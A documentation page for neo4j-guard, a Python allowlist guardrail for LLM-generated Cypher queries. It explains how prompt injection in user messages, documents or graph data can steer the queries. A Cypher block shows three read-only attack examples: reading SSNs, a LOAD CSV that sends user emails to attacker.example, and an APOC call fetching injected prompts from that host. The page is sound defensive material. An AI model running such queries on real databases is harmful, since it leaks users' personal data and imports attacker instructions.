---
title: Why neo4j-guard?
description: neo4j-guard is a guardrail for LLM-generated Cypher that blocks what read-only connections still allow, such as LOAD CSV and APOC procedures. Compatible with Neo4j Community Edition, Enterprise Edition and Aura.
sidebar_position: 2
---

## LLM-written Cypher is untrusted input

An LLM writes Cypher from the text it is given: user messages, retrieved documents and data from the graph itself. Any of that text can carry instructions, so anyone who can put text in front of the LLM can change the query it writes. The query then runs with the permissions of the database connection.

## Read-only does not stop malicious queries

The usual defense is to make the connection read-only. Enterprise Edition and Aura support read-only database users, but Community Edition does not, which leaves the MCP server's `read_only` option. Either way, read-only only blocks writes, but a query does not need to write to do damage. Each of these queries only reads:

```cypher
// Reads a property the LLM should not see
MATCH (p:Person) RETURN p.name, p.ssn

// Sends every user's email to another server
MATCH (u:User) LOAD CSV FROM 'https://attacker.example/?email=' + u.email AS row RETURN row

// Fetches new instructions for the LLM from another server
CALL apoc.load.json('https://attacker.example/prompt.json') YIELD value RETURN value
```

## neo4j-guard checks every query before it runs

`neo4j-guard` checks every query against an allowlist before Neo4j sees it, instead of only asking whether it writes. Read mode allows read clauses, built-in functions, and schema and search procedures, and blocks everything else, including `LOAD CSV` and APOC. Labels and properties in `disallow`, such as `Person.ssn`, are blocked in queries and in returned records.

It takes one call on the driver, with no server changes, and it works on Community Edition, Enterprise Edition and Aura:

```python
from neo4j import GraphDatabase
from neo4j_guard import guard

driver = guard(
    GraphDatabase.driver(URL, auth=AUTH),
    mode="read",
    disallow=["Person.ssn"],
)
```

A blocked query raises `GuardError`, and the message says what was blocked, so the LLM can rewrite the query. To install it and guard a driver, follow the [Quick start](./quick-start.md).
